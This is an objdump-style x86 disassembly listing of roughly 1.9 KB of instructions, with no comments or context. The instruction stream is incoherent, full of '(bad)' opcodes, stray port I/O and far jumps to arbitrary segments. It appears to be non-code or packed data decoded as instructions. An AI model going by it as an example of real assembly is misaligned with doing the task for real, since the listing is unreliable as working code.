  40decc:	mov    ebx,0x60f011bf
  40ded1:	test   BYTE PTR [esi-0x41fdd1c3],al
  40ded7:	dec    eax
  40ded8:	dec    ebp
  40ded9:	imul   esp,DWORD PTR [ebx+0x74233b6b],0xffffffe6
  40dee0:	cmp    cl,BYTE PTR [edi-0x34]
  40dee3:	in     eax,dx
  40dee4:	push   edi
  40dee5:	fisttp DWORD PTR [esi]
  40dee7:	jecxz  0x40de85
  40dee9:	sbb    BYTE PTR [ecx-0x16],ch
  40deec:	mov    ah,0x28
  40deee:	sbb    bh,BYTE PTR [ebp+0x5b015f7]
  40def4:	or     ebx,ebp
  40def6:	lds    eax,FWORD PTR [ebx-0x29]
  40def9:	in     al,dx
  40defa:	aad    0x23
  40defc:	daa    
  40defd:	idiv   DWORD PTR [esi]
  40deff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df00:	pop    es
  40df01:	jnp    0x40df72
  40df03:	test   eax,0x898e6f31
  40df08:	xchg   ebp,eax
  40df09:	dec    ebp
  40df0a:	pop    ss
  40df0b:	sub    al,0x72
  40df0d:	pop    eax
  40df0e:	sub    DWORD PTR [ecx+0x50],ebp
  40df11:	xchg   ecx,eax
  40df12:	mov    esi,0x271806f8
  40df17:	lds    ebp,FWORD PTR [edx-0x22115ce3]
  40df1d:	neg    dl
  40df1f:	frstor [edi+0x68]
  40df22:	push   edx
  40df23:	jne    0x40df79
  40df25:	cdq    
  40df26:	jns    0x40df15
  40df28:	cmp    ch,0x6c
  40df2b:	inc    ebx
  40df2c:	add    DWORD PTR [esi],0xc
  40df2f:	mov    ecx,0xef7a98a5
  40df34:	(bad)  
  40df35:	retf   
  40df36:	(bad)
  40df3a:	pop    eax
  40df3b:	retf   
  40df3c:	iret   
  40df3d:	and    eax,0x9a0d3950
  40df42:	shr    BYTE PTR [ecx+0x66],1
  40df45:	dec    esp
  40df46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df47:	push   ebp
  40df48:	mov    DWORD PTR [edi-0x73081c01],0xccb6c733
  40df52:	adc    edi,DWORD PTR [esi]
  40df54:	jnp    0x40dfaf
  40df56:	push   esi
  40df57:	loope  0x40df1b
  40df59:	mov    edx,0x3903c4b0
  40df5e:	fisttp WORD PTR [ecx+0x2c]
  40df61:	femms  
  40df63:	mov    ebp,0x793e28b
  40df68:	xor    eax,0x2a5be806
  40df6d:	jge    0x40df1c
  40df6f:	mov    dh,0xf5
  40df71:	jmp    0x40df70
  40df73:	sti    
  40df74:	or     cl,BYTE PTR [edi-0x80c3bef]
  40df7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df7b:	outs   dx,DWORD PTR ds:[esi]
  40df7c:	sub    edx,DWORD PTR [edx-0x4d]
  40df7f:	ins    DWORD PTR es:[edi],dx
  40df80:	mov    ecx,?
  40df82:	mov    ds,WORD PTR [ecx+0x18]
  40df85:	push   edx
  40df86:	mov    dh,0x75
  40df88:	ret    0x8c2d
  40df8b:	dec    esp
  40df8c:	retf   0x76dd
  40df8f:	xchg   esp,eax
  40df90:	or     al,0x47
  40df92:	inc    esi
  40df93:	arpl   WORD PTR [ebx-0x6],bx
  40df96:	mov    ch,0x2f
  40df98:	sahf   
  40df99:	shl    DWORD PTR [edi+0x7616dc4d],0xa8
  40dfa0:	daa    
  40dfa1:	xor    dh,BYTE PTR [ecx+0x64]
  40dfa4:	lea    esp,[ecx+0x79]
  40dfa7:	in     eax,dx
  40dfa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfa9:	jmp    0x63ee730a
  40dfae:	jmp    0x653c14da
  40dfb3:	push   ds
  40dfb4:	mov    BYTE PTR [esi-0x8c4c955],cl
  40dfba:	ins    BYTE PTR es:[edi],dx
  40dfbb:	sbb    ch,ch
  40dfbd:	mov    ah,BYTE PTR [ebp-0x43]
  40dfc0:	enter  0x4b75,0xfd
  40dfc4:	fdivr  st(5),st
  40dfc6:	mov    WORD PTR [ebx-0x60fb9510],ds
  40dfcc:	out    dx,eax
  40dfcd:	push   ss
  40dfce:	in     eax,0x89
  40dfd0:	loope  0x40e009
  40dfd2:	std    
  40dfd3:	cmc    
  40dfd4:	sbb    BYTE PTR [di-0x8],bh
  40dfd8:	or     BYTE PTR [edi+0x1d],0xaa
  40dfdc:	xor    ebp,DWORD PTR [ecx-0x59]
  40dfdf:	mov    al,0xef
  40dfe1:	lods   eax,DWORD PTR ds:[esi]
  40dfe2:	mov    eax,ds:0x807d11e8
  40dfe7:	mov    ebp,DWORD PTR [edi]
  40dfe9:	or     BYTE PTR [esi],cl
  40dfeb:	inc    esp
  40dfec:	rol    DWORD PTR [edi],cl
  40dfee:	ror    BYTE PTR [ecx],1
  40dff0:	into   
  40dff1:	dec    edi
  40dff2:	cmp    al,0x81
  40dff4:	repz inc eax
  40dff6:	ficomp DWORD PTR [edi+0x4b07e760]
  40dffc:	cmp    eax,DWORD PTR [edx-0x5e]
  40dfff:	out    0x61,al
  40e001:	add    al,BYTE PTR ds:0x1c47ed63
  40e007:	les    ecx,FWORD PTR [edi-0x1db1e7d5]
  40e00d:	sbb    al,0xff
  40e00f:	call   0x9903:0x8d6c2f86
  40e016:	push   0xffffffbf
  40e018:	and    al,0x89
  40e01a:	fdivr  st,st(3)
  40e01c:	mul    ch
  40e01e:	xor    DWORD PTR [esi],ecx
  40e020:	lar    eax,WORD PTR [eax]
  40e023:	fwait
  40e024:	jl     0x40e005
  40e026:	and    dl,ah
  40e028:	mov    eax,ds:0x805d65b6
  40e02d:	or     esp,edi
  40e02f:	ficomp DWORD PTR [ebp+0x6d]
  40e032:	cmp    DWORD PTR [ebx+0x5171357d],0xffffffda
  40e039:	mov    bh,0x72
  40e03b:	xor    eax,0x9f7dd5f5
  40e040:	out    dx,eax
  40e041:	in     eax,dx
  40e042:	and    DWORD PTR [edi-0x4a],0xffffffe9
  40e046:	jle    0x40e0c3
  40e048:	jle    0x40e063
  40e04a:	mov    cl,0x1c
  40e04c:	jmp    0x6fe1d250
  40e051:	rcr    ebx,cl
  40e053:	pop    esi
  40e054:	arpl   WORD PTR [ecx+0x3997fbf8],ax
  40e05a:	xchg   edi,eax
  40e05b:	pusha  
  40e05c:	xchg   edx,eax
  40e05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e05e:	push   ds
  40e05f:	in     eax,0x31
  40e061:	or     BYTE PTR [edi-0x758dd778],ah
  40e067:	and    BYTE PTR [eax-0x79],bl
  40e06a:	popf   
  40e06b:	(bad)  
  40e06d:	dec    ebx
  40e06e:	jmp    0x310a4676
  40e073:	sub    ch,al
  40e075:	sub    bl,BYTE PTR [esi+0x4c55c0e5]
  40e07b:	mov    eax,0x450a42ad
  40e080:	inc    eax
  40e081:	or     esp,esp
  40e083:	(bad)  
  40e084:	xchg   edx,eax
  40e085:	pop    eax
  40e086:	xchg   DWORD PTR [edx],ecx
  40e088:	hlt    
  40e089:	dec    ebx
  40e08a:	xchg   edx,eax
  40e08b:	xlat   BYTE PTR ds:[ebx]
  40e08c:	clc    
  40e08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08e:	sbb    eax,DWORD PTR [eax-0x71]
  40e091:	inc    esi
  40e092:	xlat   BYTE PTR ds:[ebx]
  40e093:	inc    ebp
  40e094:	xor    ebp,esi
  40e096:	add    eax,0xbe1ee2af
  40e09b:	(bad)  [ecx-0x46ca81e8]
  40e0a1:	adc    eax,0xe537c1a7
  40e0a6:	mov    bl,0x48
  40e0a8:	push   edx
  40e0a9:	mov    esp,0xbbfac805
  40e0ae:	mov    bh,0x8b
  40e0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b1:	out    dx,eax
  40e0b2:	mov    esp,0x38e7eae2
  40e0b7:	xchg   DWORD PTR [ebp-0x3ff65904],ebx
  40e0bd:	jge    0x40e0bf
  40e0bf:	jle    0x40e0d8
  40e0c1:	lea    ecx,[eax-0x2a30da43]
  40e0c7:	retf   0xfd01
  40e0ca:	add    edx,0x3c
  40e0cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0ce:	jmp    0x40e103
  40e0d0:	popf   
  40e0d1:	jo     0x40e0d0
  40e0d3:	lea    eax,[ecx-0xdd57bd4]
  40e0d9:	aad    0xe2
  40e0db:	and    BYTE PTR [edi+0x59],al
  40e0de:	imul   ebx,DWORD PTR [esi+0x1e1ff31e],0x5d8074fa
  40e0e8:	in     eax,dx
  40e0e9:	out    dx,al
  40e0ea:	dec    ebx
  40e0eb:	push   cs
  40e0ec:	(bad)  
  40e0ed:	arpl   bp,bx
  40e0ef:	and    cl,BYTE PTR [esi-0x34096611]
  40e0f5:	push   edx
  40e0f6:	jns    0x40e156
  40e0f8:	pop    eax
  40e0f9:	add    eax,0xf357e41
  40e0fe:	jno    0x40e0af
  40e100:	loope  0x40e15d
  40e102:	hlt    
  40e103:	inc    esp
  40e104:	xchg   ecx,eax
  40e105:	mov    edi,0x496a8fc8
  40e10a:	mov    dh,0x5f
  40e10c:	ffree  st(3)
  40e10e:	int    0x90
  40e110:	sub    dh,BYTE PTR [ebp-0x5c]
  40e113:	sahf   
  40e114:	push   ecx
  40e115:	int    0x4f
  40e117:	clc    
  40e118:	mov    dl,0x9
  40e11a:	ror    BYTE PTR [ecx-0x16],0xf8
  40e11e:	gs and edx,ebp
  40e121:	cmp    BYTE PTR [ebx-0x5e],dh
  40e124:	clc    
  40e125:	outs   dx,DWORD PTR ds:[esi]
  40e126:	push   ds
  40e127:	ins    DWORD PTR es:[edi],dx
  40e128:	mov    ecx,0x5de6eb14
  40e12d:	jnp    0x40e13a
  40e12f:	jge    0x40e104
  40e131:	enter  0xc1e4,0x9d
  40e135:	push   ss
  40e136:	jb     0x40e122
  40e138:	cmc    
  40e139:	sahf   
  40e13a:	std    
  40e13b:	scas   eax,DWORD PTR es:[edi]
  40e13c:	popa   
  40e13d:	nop
  40e13e:	jnp    0x40e18f
  40e140:	cmp    al,0x10
  40e142:	test   BYTE PTR [ecx+0x30],ah
  40e145:	pop    esi
  40e146:	push   esp
  40e147:	mov    DWORD PTR [eax+0x6c],edx
  40e14a:	pop    ebp
  40e14b:	jl     0x40e0e9
  40e14d:	pusha  
  40e14e:	sub    al,0xe5
  40e150:	lods   eax,DWORD PTR ds:[esi]
  40e151:	daa    
  40e152:	call   0x4649fd31
  40e157:	lock popf 
  40e159:	jp     0x40e1ab
  40e15b:	pop    eax
  40e15c:	adc    eax,0x37e8d7f9
  40e162:	mov    ebx,ebx
  40e164:	loopne 0x40e186
  40e166:	ds cwde 
  40e168:	test   ah,dl
  40e16a:	pushf  
  40e16b:	cwde   
  40e16c:	lds    edi,FWORD PTR [esi-0x2c667106]
  40e172:	mov    bh,0x38
  40e174:	(bad)  
  40e175:	arpl   WORD PTR [ebx+esi*8-0x55d1f00e],di
  40e17c:	ror    ebx,0xb8
  40e17f:	xor    al,0xe9
  40e181:	mov    bl,BYTE PTR ds:0x754780e
  40e187:	scas   al,BYTE PTR es:[edi]
  40e188:	or     BYTE PTR [edi+0x24],al
  40e18b:	push   edx
  40e18c:	mov    bl,BYTE PTR [ecx-0x47]
  40e18f:	jp     0x40e178
  40e191:	popa   
  40e192:	xlat   BYTE PTR ds:[ebx]
  40e193:	retf   
  40e194:	or     eax,0x66dc4d8e
  40e199:	cmp    esp,DWORD PTR [ebp-0x210cf813]
  40e19f:	inc    ebx
  40e1a0:	pusha  
  40e1a1:	nop
  40e1a2:	in     al,0x6e
  40e1a4:	(bad)  
  40e1a5:	test   al,0x2e
  40e1a7:	inc    edi
  40e1a8:	punpckhdq mm3,QWORD PTR [eax]
  40e1ab:	mov    bh,0x7c
  40e1ad:	sbb    DWORD PTR [edi],ebx
  40e1af:	ret    
  40e1b0:	jns    0x40e17c
  40e1b2:	mov    dl,0x8e
  40e1b4:	in     eax,dx
  40e1b5:	dec    ebx
  40e1b6:	clc    
  40e1b7:	add    BYTE PTR ds:0x45656932,bl
  40e1bd:	shl    sp,1
  40e1c0:	xor    al,0x98
  40e1c2:	jae    0x40e187
  40e1c4:	call   0x5c269402
  40e1c9:	adc    DWORD PTR [ecx+edi*1-0x23],esi
  40e1cd:	mov    bh,0xcf
  40e1cf:	or     al,0x20
  40e1d1:	(bad)  
  40e1d2:	jmp    0x40e1a5
  40e1d4:	add    BYTE PTR [ecx+0x27],0x43
  40e1d8:	push   ss
  40e1d9:	push   ss
  40e1da:	rcr    DWORD PTR ds:0x641d8536,cl
  40e1e0:	mov    ebp,0x952eb957
  40e1e5:	imul   edi,edi,0x5be4585f
  40e1eb:	sar    BYTE PTR fs:[edi-0x19],cl
  40e1ef:	adc    al,0x56
  40e1f1:	pop    esp
  40e1f2:	cli    
  40e1f3:	cwde   
  40e1f4:	outs   dx,BYTE PTR ds:[esi]
  40e1f5:	cdq    
  40e1f6:	sbb    BYTE PTR [ebx],al
  40e1f8:	adc    eax,0xc8c41f1d
  40e1fd:	dec    esp
  40e1fe:	mov    ds:0x1fbfa1b8,al
  40e203:	xchg   edi,eax
  40e204:	cld    
  40e205:	and    BYTE PTR [edx-0x1334700d],cl
  40e20b:	or     ebp,esi
  40e20d:	add    esi,DWORD PTR [edx]
  40e20f:	aam    0xd2
  40e211:	stos   BYTE PTR es:[edi],al
  40e212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e213:	xchg   ebp,eax
  40e214:	sbb    DWORD PTR [edi-0x3b1903c8],esi
  40e21a:	push   ebp
  40e21b:	mov    eax,ds:0xeaeaab23
  40e220:	ins    DWORD PTR es:[edi],dx
  40e221:	cmp    bl,BYTE PTR [edi-0x62000bcb]
  40e227:	into   
  40e228:	repz push edx
  40e22a:	loopne 0x40e1ba
  40e22c:	jp     0x40e226
  40e22e:	mov    es,ebx
  40e230:	mov    ecx,0x195c3adb
  40e235:	mov    ah,BYTE PTR [ebp+0x2f83cd5f]
  40e23b:	imul   esi,edi,0xffffffdb
  40e23e:	xor    eax,0x2567e634
  40e243:	cmp    al,0x67
  40e245:	(bad)
  40e249:	inc    edx
  40e24a:	and    BYTE PTR [edi-0x6c],cl
  40e24d:	pop    esi
  40e24e:	xchg   BYTE PTR [ecx],ch
  40e250:	pop    esi
  40e251:	lahf   
  40e252:	push   ebx
  40e253:	push   esi
  40e254:	adc    ecx,DWORD PTR [eax+0x3dc52cf6]
  40e25a:	or     DWORD PTR [edx],eax
  40e25c:	div    DWORD PTR [esi]
  40e25e:	mov    esp,0xb50c5d5
  40e263:	movlps QWORD PTR ds:0x17b13366,xmm1
  40e26a:	repnz push edi
  40e26c:	imul   edi
  40e26e:	test   BYTE PTR [ebp-0x42679c84],al
  40e274:	dec    ebp
  40e275:	retf   
  40e276:	or     DWORD PTR [eax+0x0],ebx
  40e279:	add    eax,0x484f8f26
  40e27e:	xor    BYTE PTR [edx],dh
  40e280:	xchg   bh,ch
  40e282:	jecxz  0x40e2a2
  40e284:	popf   
  40e285:	inc    edi
  40e286:	imul   edi,DWORD PTR [edx-0x1a5c0941],0x7552deb6
  40e290:	shr    BYTE PTR [ecx-0x164c6bf9],cl
  40e296:	mov    WORD PTR [eax-0x274f5824],ss
  40e29c:	push   cs
  40e29d:	inc    esp
  40e29e:	pop    ebx
  40e29f:	sbb    edi,edi
  40e2a1:	sar    esp,1
  40e2a3:	stos   BYTE PTR es:[edi],al
  40e2a4:	jb     0x40e234
  40e2a6:	fild   WORD PTR [eax-0x2d]
  40e2a9:	stos   DWORD PTR es:[edi],eax
  40e2aa:	(bad)  [ebx]
  40e2ac:	xchg   ebp,eax
  40e2ad:	scas   al,BYTE PTR es:[edi]
  40e2ae:	es std 
  40e2b0:	aas    
  40e2b1:	imul   edx,DWORD PTR [esp+ebx*4],0xb72087bf
  40e2b8:	hlt    
  40e2b9:	das    
  40e2ba:	daa    
  40e2bb:	imul   ebx,DWORD PTR [ebx],0x891a8ad3
  40e2c1:	pop    ecx
  40e2c2:	enter  0xd18f,0x94
  40e2c6:	dec    eax
  40e2c7:	cwde   
  40e2c8:	push   0x8d257fea
  40e2cd:	dec    esp
  40e2ce:	in     eax,dx
  40e2cf:	or     al,BYTE PTR [ecx]
  40e2d1:	dec    esp
  40e2d2:	fwait
  40e2d3:	jns    0x40e2cc
  40e2d5:	mov    ds:0x8c345096,eax
  40e2da:	mov    ch,0x3d
  40e2dc:	retf   
  40e2dd:	push   ebp
  40e2de:	xchg   edx,eax
  40e2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e0:	sub    al,0xca
  40e2e2:	hlt    
  40e2e3:	seta   BYTE PTR [eax+0x5bf1fc7a]
  40e2ea:	mov    dl,0xd3
  40e2ec:	lods   eax,DWORD PTR ds:[esi]
  40e2ed:	sbb    BYTE PTR [edi],bh
  40e2ef:	xchg   ecx,eax
  40e2f0:	inc    esp
  40e2f1:	jbe    0x40e287
  40e2f3:	xor    DWORD PTR [esp+esi*2+0x6a2534cc],esp
  40e2fa:	mov    es,WORD PTR [edx+ebx*1-0x63]
  40e2fe:	jnp    0x40e2c0
  40e300:	call   0x8cc1:0xd03e86f2
  40e307:	dec    ebx
  40e308:	jmp    0x1283d1e0
  40e30d:	mov    ds:0x1ed59c54,al
  40e312:	adc    esp,DWORD PTR [ebp-0x55e5846f]
  40e318:	test   BYTE PTR [ecx-0x7fd3fa48],ah
  40e31e:	cmp    DWORD PTR [esi],0xc46c1621
  40e324:	icebp  
  40e325:	inc    ebp
  40e326:	or     eax,0xe6fa80a7
  40e32b:	push   esp
  40e32c:	mov    esi,0x39e58c2
  40e331:	sti    
  40e332:	pop    ebx
  40e333:	inc    ebp
  40e334:	in     eax,0x71
  40e336:	fstp   TBYTE PTR [eax]
  40e338:	scas   al,BYTE PTR es:[edi]
  40e339:	es ret 
  40e33b:	mov    esp,0xf989f740
  40e340:	cld    
  40e341:	fsubr  st,st(7)
  40e343:	dec    esi
  40e344:	push   edi
  40e345:	js     0x40e342
  40e347:	ret    
  40e348:	imul   edi,DWORD PTR [eax],0x7a
  40e34b:	sahf   
  40e34c:	xor    DWORD PTR [esi],ebp
  40e34e:	sbb    eax,0x47e9f1d6
  40e353:	mov    bl,0x58
  40e355:	mov    bh,BYTE PTR [edx+0x5049e834]
  40e35b:	loop   0x40e36f
  40e35d:	adc    DWORD PTR [edi-0x2f],esi
  40e360:	cmp    bl,BYTE PTR [ebx-0x29fe7059]
  40e366:	ja     0x40e33e
  40e368:	jnp    0x40e3c9
  40e36a:	push   ecx
  40e36b:	add    al,0x6a
  40e36d:	fisttp QWORD PTR [edi+0x41]
  40e370:	jg     0x40e2f9
  40e372:	xchg   DWORD PTR ds:0x5ad33a2a,edi
  40e378:	mov    ds:0x46f7e8ec,al
  40e37d:	inc    ebx
  40e37e:	imul   edx,DWORD PTR [ebx+0x3f],0x7d
  40e382:	push   eax
  40e383:	mov    ebx,0xc8a52f7b
  40e388:	pop    ss
  40e389:	sar    ebp,cl
  40e38b:	call   ebx
  40e38d:	out    0x36,eax
  40e38f:	repz and esp,DWORD PTR [ebp+0x61]
  40e393:	aam    0x6
  40e395:	sub    eax,0xff108b47
  40e39a:	mov    edx,ecx
  40e39c:	adc    al,0x0
  40e39e:	lock inc esi
  40e3a0:	fidiv  DWORD PTR [ecx+0x7b]
  40e3a3:	js     0x40e3d8
  40e3a5:	push   edi
  40e3a6:	or     DWORD PTR [ebp-0x7b9653e6],esi
  40e3ac:	push   0x1a
  40e3ae:	imul   ebx,DWORD PTR [ecx+edi*1],0xb7f48708
  40e3b5:	lock pop esp
  40e3b7:	push   ebx
  40e3b8:	adc    al,0x5
  40e3ba:	lock leave 
  40e3bc:	or     ecx,0x31
  40e3bf:	jne    0x40e3e6
  40e3c1:	and    eax,0x3e5c078f
  40e3c6:	sbb    DWORD PTR [ecx-0x2b],esi
  40e3c9:	pop    ss
  40e3ca:	add    DWORD PTR [esi],ecx
  40e3cc:	into   
  40e3cd:	mov    DWORD PTR [esi-0x33762e32],edi
  40e3d3:	retf   0x561e
  40e3d6:	aas    
  40e3d7:	push   edi
  40e3d8:	xchg   edi,ecx
  40e3da:	(bad)  
  40e3db:	clc    
  40e3dc:	mov    dh,BYTE PTR [edx]
  40e3de:	ins    DWORD PTR es:[edi],dx
  40e3df:	imul   eax,DWORD PTR [edi-0x28],0x62279bd3
  40e3e6:	mov    ebx,0x90584d88
  40e3eb:	xchg   edx,eax
  40e3ec:	jne    0x40e3cc
  40e3ee:	outs   dx,BYTE PTR ds:[esi]
  40e3ef:	lea    ebx,[ebp-0x64]
  40e3f2:	dec    eax
  40e3f3:	out    0x77,al
  40e3f5:	adc    BYTE PTR [ebx],bl
  40e3f7:	div    DWORD PTR [ebp+eiz*2-0x49084cd9]
  40e3fe:	xor    eax,0xeb527f57
  40e403:	xchg   esi,eax
  40e404:	ret    0x9b4f
  40e407:	or     DWORD PTR [edx],0xd3926466
  40e40d:	add    BYTE PTR [edi+0x2e2dce6d],al
  40e413:	jnp    0x40e439
  40e415:	(bad)  
  40e416:	xchg   edi,eax
  40e417:	or     ah,BYTE PTR [ebx+edx*8]
  40e41a:	je     0x40e3a3
  40e41c:	inc    esi
  40e41d:	out    dx,eax
  40e41e:	pop    edi
  40e41f:	(bad)  
  40e420:	push   edi
  40e421:	mov    ch,BYTE PTR [eax+0x1d]
  40e424:	aad    0x3c
  40e426:	inc    esp
  40e427:	xchg   ebx,eax
  40e428:	scas   eax,DWORD PTR es:[edi]
  40e429:	outs   dx,BYTE PTR ds:[esi]
  40e42a:	sub    DWORD PTR [ecx],edx
  40e42c:	inc    ebx
  40e42d:	icebp  
  40e42e:	dec    edx
  40e42f:	call   0xbc6cba2f
  40e434:	mov    ds:0x8575738d,eax
  40e439:	mov    bh,BYTE PTR [esi-0x35]
  40e43c:	cdq    
  40e43d:	xchg   esp,eax
  40e43e:	pop    ecx
  40e43f:	clc    
  40e440:	sbb    eax,0x1ec17c1a
  40e445:	and    esi,DWORD PTR [ecx+ebp*8+0x674bb48f]
  40e44c:	jp     0x40e4bb
  40e44e:	loop   0x40e4bb
  40e450:	fcom   DWORD PTR [ecx+0x24]
  40e453:	jnp    0x40e44c
  40e455:	in     eax,0x2f
  40e457:	inc    esp
  40e458:	sub    ch,BYTE PTR [edi+0x23]
  40e45b:	jl     0x40e407
  40e45d:	push   edx
  40e45e:	test   BYTE PTR [edx-0x3921816f],al
  40e464:	stc    
  40e465:	shl    BYTE PTR [edx-0x6d638091],1
  40e46b:	mov    al,0x9d
  40e46d:	loopne 0x40e41d
  40e46f:	rcl    DWORD PTR [edi],0xfb
  40e472:	stc    
  40e473:	mov    esi,0xae32eb52
  40e478:	add    cl,BYTE PTR [edi]
  40e47a:	fcomp  DWORD PTR [ebx+0x26f7144b]
  40e480:	pop    es
  40e481:	add    DWORD PTR [esi+0x71581e5b],ecx
  40e487:	out    0x5c,eax
  40e489:	aas    
  40e48a:	pop    esi
  40e48b:	mov    ds:0x3b1cb734,al
  40e490:	sub    bh,cl
  40e492:	test   eax,0xd3da8630
  40e497:	mov    cs,WORD PTR ds:0xf26b9999
  40e49d:	sbb    ch,BYTE PTR [ebx+0x71]
  40e4a0:	mov    DWORD PTR [edi+0x7b],edi
  40e4a3:	sbb    esp,esi
  40e4a5:	xchg   esi,eax
  40e4a6:	push   0x1c7b33ce
  40e4ab:	lds    esi,FWORD PTR [ebx]
  40e4ad:	mov    edi,DWORD PTR [edi+0x30e6f04b]
  40e4b3:	addr16 mov al,0x82
  40e4b6:	jle    0x40e449
  40e4b8:	shr    DWORD PTR [eax+0x2],cl
  40e4bb:	dec    ecx
  40e4bc:	fwait
  40e4bd:	mov    eax,ds:0x42804045
  40e4c2:	scas   al,BYTE PTR es:[edi]
  40e4c3:	or     eax,0x47e64b1a
  40e4c8:	inc    esi
  40e4c9:	and    cl,al
  40e4cb:	cmp    DWORD PTR ds:0x30059c9b,ebx
  40e4d1:	fcom   DWORD PTR [esi]
  40e4d3:	test   cl,0xed
  40e4d6:	clc    
  40e4d7:	dec    eax
  40e4d8:	cmp    eax,DWORD PTR [esi+0x6e1e9af8]
  40e4de:	ror    DWORD PTR [edx+0x6cf698e5],1
  40e4e4:	sar    ebx,cl
  40e4e6:	jbe    0x40e523
  40e4e8:	cmp    dh,ah
  40e4ea:	xor    eax,0xa13deb8d
  40e4ef:	ins    DWORD PTR es:[edi],dx
  40e4f0:	xor    eax,0x10e45620
  40e4f5:	sub    DWORD PTR [edi-0x43],ebp
  40e4f8:	(bad)  
  40e4fc:	pop    DWORD PTR [ebp+0x35]
  40e4ff:	sub    eax,0xc250a298
  40e504:	in     eax,0x3d
  40e506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e507:	or     DWORD PTR [eax+ecx*1-0x61679485],ecx
  40e50e:	mov    cl,0x9e
  40e511:	lods   eax,DWORD PTR ds:[esi]
  40e512:	mov    ch,0x91
  40e514:	push   edi
  40e515:	push   edx
  40e516:	inc    edi
  40e517:	adc    al,BYTE PTR [edx+0x5a]
  40e51a:	outs   dx,DWORD PTR ds:[esi]
  40e51b:	sbb    ebp,esi
  40e51d:	pop    edi
  40e51e:	mov    ebx,0x48033568
  40e523:	out    dx,al
  40e524:	lods   al,BYTE PTR ds:[esi]
  40e525:	push   ebp
  40e526:	inc    edi
  40e527:	das    
  40e528:	cld    
  40e529:	std    
  40e52a:	xor    DWORD PTR [ecx+0x15a092d5],ebp
  40e530:	jne    0x40e50d
  40e532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e533:	(bad)  
  40e534:	data16 fadd QWORD PTR [eax+0x46]
  40e538:	sub    ch,0xeb
  40e53b:	mov    ah,0xf0
  40e53d:	call   0x2f77:0x9706d2fe
  40e544:	cmp    BYTE PTR [ecx-0x58f9594f],cl
  40e54a:	lahf   
  40e54b:	fild   WORD PTR [ecx+0x40]
  40e54e:	jmp    0x44560415
  40e553:	sub    ch,BYTE PTR [eax]
  40e555:	ins    BYTE PTR es:[edi],dx
  40e556:	inc    edx
  40e557:	in     al,0x7a
  40e559:	mov    cl,0xa2
  40e55b:	mov    dl,0xb8
  40e55d:	out    0x83,al
  40e55f:	into   
  40e560:	xlat   BYTE PTR ds:[ebx]
  40e561:	daa    
  40e562:	xchg   ecx,eax
  40e563:	lahf   
  40e564:	data16 (bad) 
  40e566:	jmp    0x29ff:0x5abff18c
  40e56d:	mov    bl,0xca
  40e56f:	sub    eax,0xd7edd54e
  40e574:	dec    ebx
  40e575:	out    0x94,al
  40e577:	mov    al,BYTE PTR [ebx+0x7eab23ec]
  40e57d:	xchg   ebx,eax
  40e57e:	sub    ah,BYTE PTR [ebp+eax*2-0x24707450]
  40e585:	push   ebx
  40e586:	nop
  40e587:	and    BYTE PTR [esi+0x57f19c2d],dl
  40e58d:	pop    ecx
  40e58e:	in     eax,0x24
  40e590:	retf   0x67eb
  40e593:	sub    dh,BYTE PTR [edi+0x66]
  40e596:	mov    esp,edi
  40e598:	and    ebp,DWORD PTR [esi+0xc]
  40e59b:	inc    ebx
  40e59c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e59d:	xchg   DWORD PTR [esi],eax
  40e59f:	cmp    eax,0xca60396d
  40e5a4:	sbb    al,0xe5
  40e5a6:	mov    dh,0x21
  40e5a8:	and    eax,0xb8ec87c5
  40e5ad:	inc    ebp
  40e5ae:	stos   DWORD PTR es:[edi],eax
  40e5af:	and    eax,0x82420e47
  40e5b4:	clc    
  40e5b5:	iret   
  40e5b6:	out    dx,eax
  40e5b7:	ret    0xd611
  40e5ba:	test   eax,0x1fcef8ff
  40e5bf:	pop    es
  40e5c0:	into   
  40e5c1:	adc    eax,0xa8d225e0
  40e5c6:	and    ah,BYTE PTR [ebp+0x49360ab]
  40e5cc:	(bad)  
  40e5cd:	shl    DWORD PTR [esi-0x39],0xa9
  40e5d1:	(bad)  
  40e5d2:	jae    0x40e5b3
  40e5d4:	xor    dl,BYTE PTR [edx+0x3c6d7fe5]
  40e5da:	dec    edx
  40e5db:	pop    ebp
  40e5dc:	outs   dx,DWORD PTR ds:[esi]
  40e5dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5de:	fstp   QWORD PTR [ebx]
  40e5e0:	push   eax
  40e5e1:	mov    ds:0xa234a5c0,al
  40e5e6:	(bad)  
  40e5e8:	sbb    DWORD PTR [ebx],esp
  40e5ea:	out    0x41,al
  40e5ec:	mov    bl,0x51
  40e5ee:	in     al,0xd6
  40e5f0:	(bad)  
  40e5f1:	jo     0x40e62d
  40e5f3:	lock push eax
  40e5f5:	das    
  40e5f6:	aad    0x21
  40e5f8:	push   eax
  40e5f9:	mov    cl,0xb0
  40e5fb:	and    DWORD PTR fs:[esi+0x5f],ebp
  40e5ff:	mov    edi,0x9acdcf9d
  40e604:	nop
  40e605:	mov    ds:0x37019067,eax
  40e60a:	sub    ch,BYTE PTR [edx+edx*2-0x701b0f4b]
  40e611:	add    ebp,ebx
  40e613:	into   
  40e614:	jns    0x40e5f4
  40e616:	and    eax,0x29f06f69
  40e61b:	test   BYTE PTR [edi-0x5e],ah
  40e61e:	add    DWORD PTR [edi-0x6fc8d387],0x39
  40e625:	test   DWORD PTR [edx-0x11],esp
  40e628:	push   ds
  40e629:	push   esp
  40e62a:	and    al,0x5c
  40e62c:	call   0x5d6da56
  40e631:	jl     0x40e5e1
  40e633:	inc    esi
  40e634:	mov    ebx,0x63192061
  40e639:	mov    ah,BYTE PTR [eax-0x22648d96]
  40e63f:	cmp    BYTE PTR [edi-0x29],cl
  40e642:	dec    esp
  40e643:	cmp    eax,DWORD PTR [eax+0xb]
  40e646:	in     al,dx
  40e647:	fld    TBYTE PTR [esp+eax*8]
